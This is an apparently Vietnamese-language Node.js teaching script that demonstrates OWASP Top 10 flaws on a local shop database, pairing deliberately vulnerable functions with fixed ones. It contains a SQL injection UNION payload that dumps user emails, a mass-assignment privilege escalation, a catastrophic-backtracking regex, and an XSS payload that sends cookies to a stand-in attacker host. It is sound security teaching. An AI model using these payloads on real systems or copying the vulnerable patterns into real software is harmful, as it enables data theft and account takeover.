/**
 * Buổi 22 — OWASP Top 10: TỰ KHAI THÁC rồi TỰ VÁ.
 *
 * ⚠️ Mọi lỗ hổng ở đây được cài CÓ CHỦ ĐÍCH để học.
 *    Không bao giờ viết code như phần "❌" trong dự án thật.
 *
 * Chạy:  node --env-file=.env src/demo-owasp.js
 */

import { prisma } from './lib/prisma.js';
import { bamMatKhau } from './modules/auth/mat-khau.js';

const gach = (t) => console.log(`\n${'═'.repeat(64)}\n  ${t}\n${'═'.repeat(64)}\n`);

// ── Dựng dữ liệu ────────────────────────────────────────────────
await prisma.donHangItem.deleteMany();
await prisma.donHang.deleteMany();
await prisma.gioHangItem.deleteMany();
await prisma.gioHang.deleteMany();
await prisma.sanPham.deleteMany();
await prisma.danhMuc.deleteMany();
await prisma.refreshToken.deleteMany();
await prisma.user.deleteMany();

const hash = await bamMatKhau('matkhau-du-dai');
await prisma.user.createMany({
  data: [
    { email: 'admin@shop.com', ten: 'Sếp', matKhauHash: hash, vaiTro: 'admin' },
    { email: 'an@shop.com', ten: 'An', matKhauHash: hash, vaiTro: 'khach' },
    { email: 'binh@shop.com', ten: 'Bình', matKhauHash: hash, vaiTro: 'khach' },
  ],
});

const dm = await prisma.danhMuc.create({ data: { ten: 'Phụ kiện', slug: 'phu-kien' } });
await prisma.sanPham.createMany({
  data: [
    { ten: 'Tai nghe', slug: 'tai-nghe', giaVND: 1_290_000, tonKho: 10, danhMucId: dm.id },
    { ten: 'Sạc nhanh', slug: 'sac-nhanh', giaVND: 450_000, tonKho: 5, danhMucId: dm.id },
  ],
});

// ═══════════════════════════════════════════════════════════════
gach('A03 — SQL INJECTION');
// ═══════════════════════════════════════════════════════════════

/** ❌ Ghép chuỗi vào SQL — lỗ hổng kinh điển nhất lịch sử web. */
async function timSanPhamHong(tuKhoa) {
  // $queryRawUnsafe KHÔNG tham số hoá. Chuỗi đi thẳng vào câu SQL.
  return prisma.$queryRawUnsafe(
    `SELECT id, ten, "giaVND" FROM san_phams WHERE ten LIKE '%${tuKhoa}%'`
  );
}

/** ✅ Tham số hoá — Prisma gửi câu lệnh và dữ liệu RIÊNG BIỆT. */
async function timSanPhamAnToan(tuKhoa) {
  return prisma.$queryRaw`
    SELECT id, ten, "giaVND" FROM san_phams WHERE ten LIKE ${'%' + tuKhoa + '%'}
  `;
}

console.log('Tìm bình thường:');
console.log('  ', (await timSanPhamHong('Tai')).map((s) => s.ten));

console.log('\n🚨 Kẻ tấn công gõ vào ô tìm kiếm:');
const doc = `' UNION SELECT id, email, 0 FROM users --`;
console.log(`   ${doc}\n`);

const bịLộ = await timSanPhamHong(doc);
console.log('  Kết quả từ hàm CÓ LỖ HỔNG:');
for (const r of bịLộ) console.log(`     id=${r.id}  ${r.ten}`);
console.log('  → 🚨 TOÀN BỘ EMAIL NGƯỜI DÙNG BỊ LỘ\n');

const anToan = await timSanPhamAnToan(doc).catch(() => []);
console.log(`  Kết quả từ hàm AN TOÀN: ${anToan.length} dòng`);
console.log('  → ✅ Chuỗi độc bị coi là DỮ LIỆU tìm kiếm, không phải LỆNH\n');

console.log(`  VÌ SAO tham số hoá an toàn?
    Database nhận câu lệnh và dữ liệu qua HAI ĐƯỜNG RIÊNG.
    Câu lệnh đã được biên dịch xong TRƯỚC KHI dữ liệu tới —
    nên dữ liệu không thể trở thành lệnh, dù chứa ký tự gì.

  QUY TẮC: dùng Prisma Client hoặc $queryRaw (có backtick).
           TUYỆT ĐỐI KHÔNG $queryRawUnsafe với dữ liệu từ người dùng.`);

// ═══════════════════════════════════════════════════════════════
gach('A04 — MASS ASSIGNMENT');
// ═══════════════════════════════════════════════════════════════

const an = await prisma.user.findUnique({ where: { email: 'an@shop.com' } });

/** ❌ Nhận thẳng body của client. */
async function capNhatHoSoHong(userId, body) {
  return prisma.user.update({ where: { id: userId }, data: body });
}

/** ✅ Chỉ lấy các trường CHO PHÉP. */
async function capNhatHoSoAnToan(userId, body) {
  return prisma.user.update({
    where: { id: userId },
    data: { ten: body.ten },   // ← danh sách trắng, không spread
  });
}

console.log(`Vai trò của An trước: ${an.vaiTro}`);
console.log(`\n🚨 An gửi lên: { "ten": "An", "vaiTro": "admin" }\n`);

const sauHong = await capNhatHoSoHong(an.id, { ten: 'An', vaiTro: 'admin' });
console.log(`  Hàm CÓ LỖ HỔNG  → vai trò: ${sauHong.vaiTro}  🚨 TỰ NÂNG QUYỀN THÀNH ADMIN`);

await prisma.user.update({ where: { id: an.id }, data: { vaiTro: 'khach' } });

const sauAnToan = await capNhatHoSoAnToan(an.id, { ten: 'An', vaiTro: 'admin' });
console.log(`  Hàm AN TOÀN     → vai trò: ${sauAnToan.vaiTro}  ✅ trường lạ bị bỏ qua`);

console.log(`
  BA LỚP PHÒNG THỦ (Project 2 dùng cả ba):
    1. zod .strict()          → TỪ CHỐI request có trường lạ (buổi 11)
    2. danh sách trắng ở service → chỉ gán trường cho phép
    3. không bao giờ  data: req.body`);

// ═══════════════════════════════════════════════════════════════
gach('A03 — XSS LƯU TRỮ (qua API)');
// ═══════════════════════════════════════════════════════════════

const doc_xss = '<img src=x onerror="fetch(\'https://ke-tan-cong.com?c=\'+document.cookie)">';

const spDoc = await prisma.sanPham.create({
  data: { ten: doc_xss, slug: 'xss-test', giaVND: 1000, tonKho: 1, danhMucId: dm.id },
});

console.log('Kẻ tấn công đặt TÊN SẢN PHẨM là:');
console.log(`  ${doc_xss}\n`);
console.log('API trả về nguyên văn chuỗi đó cho MỌI người xem.');
console.log('Nếu frontend render bằng innerHTML / v-html / dangerouslySetInnerHTML');
console.log('→ script chạy trên trình duyệt của MỌI khách hàng → mất cookie.\n');

console.log(`  ĐIỂM QUAN TRỌNG: XSS là lỗ hổng của TẦNG HIỂN THỊ,
  nhưng backend VẪN có trách nhiệm:

    1. Giới hạn độ dài và ký tự cho phép (zod)
    2. Làm sạch HTML nếu trường đó CHO PHÉP HTML (dùng thư viện, đừng tự viết)
    3. Đặt header Content-Security-Policy (buổi 23)
    4. Trả Content-Type: application/json — KHÔNG BAO GIỜ text/html

  "Frontend lo XSS" là câu trả lời SAI. Phòng thủ phải theo TẦNG.`);

await prisma.sanPham.delete({ where: { id: spDoc.id } });

// ═══════════════════════════════════════════════════════════════
gach('ReDoS — TỪ CHỐI DỊCH VỤ BẰNG BIỂU THỨC CHÍNH QUY');
// ═══════════════════════════════════════════════════════════════

// Regex "xấu": có nhóm lặp lồng nhau → độ phức tạp tăng theo HÀM MŨ
const regexXau = /^(a+)+$/;
const chuoiDoc = 'a'.repeat(28) + 'b';

console.log(`  Regex:  /^(a+)+$/`);
console.log(`  Chuỗi:  "${'a'.repeat(28)}b"  (chỉ ${chuoiDoc.length} ký tự)\n`);

const batDau = Date.now();
regexXau.test(chuoiDoc);
const msec = Date.now() - batDau;

console.log(`  Thời gian khớp: ${msec} ms  🚨 với chuỗi CHỈ ${chuoiDoc.length} KÝ TỰ`);
console.log(`
  → Nhớ buổi 02: regex chạy ĐỒNG BỘ, CHẶN EVENT LOOP.
    Kẻ tấn công gửi vài request như vậy là server ĐỨNG HÌNH hoàn toàn.

  DẤU HIỆU REGEX NGUY HIỂM: nhóm lặp lồng nhau
      (a+)+     (a*)*     (a|a)*     (\\d+)*

  CÁCH PHÒNG:
    · Tránh nhóm lặp lồng nhau
    · Giới hạn ĐỘ DÀI đầu vào TRƯỚC khi chạy regex (zod .max())
    · Dùng thư viện kiểm tra regex an toàn khi regex do người dùng nhập`);

// ═══════════════════════════════════════════════════════════════
gach('A05 — RÒ RỈ THÔNG TIN QUA THÔNG BÁO LỖI');
// ═══════════════════════════════════════════════════════════════

try {
  await prisma.$queryRawUnsafe('SELECT * FROM bang_khong_ton_tai');
} catch (err) {
  const tho = err.message;
  console.log('  Thông báo lỗi GỐC của Prisma (rút gọn):');
  console.log(`     ${tho.split('\n').filter(Boolean).slice(-2).join(' ').slice(0, 150)}...\n`);
  console.log(`  Nếu trả nguyên văn cho client, kẻ tấn công biết được:
     · Hệ quản trị database đang dùng và PHIÊN BẢN
     · Tên bảng, tên cột thật
     · Đường dẫn thư mục trên máy chủ (qua stack trace)
     · Tên và phiên bản thư viện → tra lỗ hổng đã công bố

  Project 2 xử lý đúng (buổi 18):
     log ĐẦY ĐỦ cho mình  →  trả { loi: "Lỗi máy chủ nội bộ", requestId } cho client`);
}

// ═══════════════════════════════════════════════════════════════
gach('TỔNG KẾT — DANH SÁCH KIỂM TRA');
// ═══════════════════════════════════════════════════════════════

const checklist = [
  ['A01 Broken Access Control', 'kiểm quyền theo CHỦ SỞ HỮU ở mọi endpoint', 'buổi 16'],
  ['A02 Cryptographic Failures', 'bcrypt cost 12, HTTPS, không tự chế mã hoá', 'buổi 15'],
  ['A03 Injection (SQL)', 'không bao giờ $queryRawUnsafe với input người dùng', 'buổi 22'],
  ['A03 Injection (XSS)', 'giới hạn input + CSP + Content-Type đúng', 'buổi 22–23'],
  ['A04 Insecure Design', 'zod .strict(), danh sách trắng, rate limit', 'buổi 11, 21'],
  ['A05 Security Misconfig', 'helmet, không lộ stack trace, tắt debug', 'buổi 18, 23'],
  ['A06 Vulnerable Components', 'npm audit, cập nhật thư viện định kỳ', 'buổi 22'],
  ['A07 Auth Failures', 'chống dò tài khoản, rate limit login, token rotation', 'buổi 15'],
  ['A08 Data Integrity', 'transaction + khoá dòng, kiểm tra ràng buộc ở DB', 'buổi 19'],
  ['A09 Logging Failures', 'log có cấu trúc, che dữ liệu nhạy cảm, requestId', 'buổi 18'],
  ['A10 SSRF', 'không cho người dùng chỉ định URL để server gọi', 'buổi 24'],
];

for (const [ten, cach, buoi] of checklist) {
  console.log(`  ${ten.padEnd(30)} ${cach.padEnd(52)} ${buoi}`);
}

console.log(`
  → Bảo mật KHÔNG phải một buổi học. Nó là thứ xuyên suốt mọi buổi.
    Bảng trên cho thấy ta đã chạm tới 9/10 mục mà không cần gọi tên chúng.
`);

await prisma.$disconnect();
